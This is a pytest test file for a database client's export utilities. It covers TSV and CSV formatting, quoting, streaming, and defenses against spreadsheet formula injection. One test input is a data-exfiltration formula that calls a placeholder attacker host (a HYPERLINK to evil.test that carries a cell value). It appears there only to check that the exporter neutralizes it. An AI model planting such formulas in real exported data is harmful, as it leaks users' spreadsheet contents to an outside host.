from __future__ import annotations

import csv
import io

import pytest

from snowdesk.model import ColumnInfo
from snowdesk.util.export import neutralize_formula, rows_to_tsv, write_csv

COLUMNS = [ColumnInfo("ID", "FIXED", 38, 0), ColumnInfo("NAME", "TEXT")]
ROWS = [(1, "alice"), (2, None), (3, "with\ttab")]


def test_tsv_without_headers() -> None:
    assert rows_to_tsv(ROWS, COLUMNS) == '1\talice\n2\tNULL\n3\t"with\ttab"'


def test_tsv_with_headers() -> None:
    assert rows_to_tsv(ROWS[:1], COLUMNS, with_headers=True) == "ID\tNAME\n1\talice"


def test_tsv_column_subset_keeps_order() -> None:
    assert rows_to_tsv(ROWS[:1], COLUMNS, with_headers=True, column_indexes=[1]) == "NAME\nalice"


def test_tsv_quotes_line_breaks() -> None:
    assert rows_to_tsv([(1, "a\nb")], COLUMNS) == '1\t"a\nb"'
    assert rows_to_tsv([(1, "a\r\nb")], COLUMNS) == '1\t"a\r\nb"'


def test_tsv_doubles_quotes_inside_a_quoted_field() -> None:
    assert rows_to_tsv([(1, '"hi"\nthere')], COLUMNS) == '1\t"""hi""\nthere"'
    assert rows_to_tsv([(1, '"hi"')], COLUMNS) == '1\t"""hi"""'


def test_tsv_leaves_a_quote_after_the_start_alone() -> None:
    """Compact JSON is full of quotes, none of which a spreadsheet minds."""
    assert rows_to_tsv([(1, '{"a":1}')], COLUMNS) == '1\t{"a":1}'


def test_tsv_round_trips_through_a_spreadsheet_reader() -> None:
    """Excel's own tab dialect is what a paste is parsed with."""
    rows = [(1, '{\n  "a": "x\ty"\n}'), (2, '"quoted"'), (3, "plain")]
    tsv = rows_to_tsv(rows, COLUMNS, with_headers=True, escape_formulas=False)
    parsed = list(csv.reader(io.StringIO(tsv, newline=""), dialect="excel-tab"))
    assert parsed == [["ID", "NAME"], *[[str(i), text] for i, text in rows]]


def test_write_csv_streams_batches() -> None:
    buffer = io.StringIO()
    batches = iter([[(1, "alice")], [(2, None)]])
    written = write_csv(buffer, COLUMNS, batches)
    assert written == 2
    assert buffer.getvalue().splitlines() == ["ID,NAME", "1,alice", "2,"]


def test_write_csv_does_not_materialise_the_whole_result() -> None:
    consumed: list[int] = []

    def batches():
        for i in range(3):
            consumed.append(i)
            yield [(i, "x")]

    buffer = io.StringIO()
    write_csv(buffer, COLUMNS, batches())
    assert consumed == [0, 1, 2]


# -- spreadsheet formula injection ------------------------------------------
#
# A value a spreadsheet evaluates on open is code running on the machine of
# whoever exported the result, chosen by whoever could write the row.


FORMULAS = [
    ("=1+1", "'=1+1"),
    ('=HYPERLINK("http://evil.test/?d="&A2,"click")', "'=HYPERLINK"),
    ("+1", "'+1"),
    ("-1+1", "'-1+1"),
    ("@SUM(1)", "'@SUM(1)"),
    ("\tleading tab", "'\tleading tab"),
    ("\rleading return", "'\rleading return"),
]


@pytest.mark.parametrize(("value", "expected_start"), FORMULAS)
def test_neutralize_formula_prefixes_what_a_spreadsheet_would_run(
    value: str, expected_start: str
) -> None:
    assert neutralize_formula(value).startswith(expected_start)


@pytest.mark.parametrize("value", ["alice", "1", "2026-09-20", "", "a=b", "no-lead -here"])
def test_neutralize_formula_leaves_ordinary_values_alone(value: str) -> None:
    assert neutralize_formula(value) == value


def test_csv_escapes_formulas_by_default() -> None:
    buffer = io.StringIO()
    write_csv(buffer, COLUMNS, [[(1, "=1+1")]])
    assert "'=1+1" in buffer.getvalue()


def test_csv_escapes_a_column_named_like_a_formula() -> None:
    """A header is as much the account's to choose as a value: SELECT 1 AS "=x"."""
    buffer = io.StringIO()
    write_csv(buffer, [ColumnInfo("=cmd", "TEXT")], [[("a",)]])
    assert buffer.getvalue().startswith("'=cmd")


def test_csv_escaping_can_be_turned_off() -> None:
    buffer = io.StringIO()
    write_csv(buffer, COLUMNS, [[(1, "=1+1")]], escape_formulas=False)
    assert "'" not in buffer.getvalue()


def test_tsv_escapes_formulas_for_the_clipboard() -> None:
    """The clipboard's usual destination is the same spreadsheet."""
    assert rows_to_tsv([(1, "=1+1")], COLUMNS) == "1\t'=1+1"


def test_tsv_escaping_can_be_turned_off() -> None:
    assert rows_to_tsv([(1, "=1+1")], COLUMNS, escape_formulas=False) == "1\t=1+1"


def test_a_leading_tab_is_neutralized_inside_the_quotes() -> None:
    """The quotes keep the tab in its cell; the apostrophe keeps it text."""
    assert rows_to_tsv([(1, "\tx")], COLUMNS) == '1\t"\'\tx"'
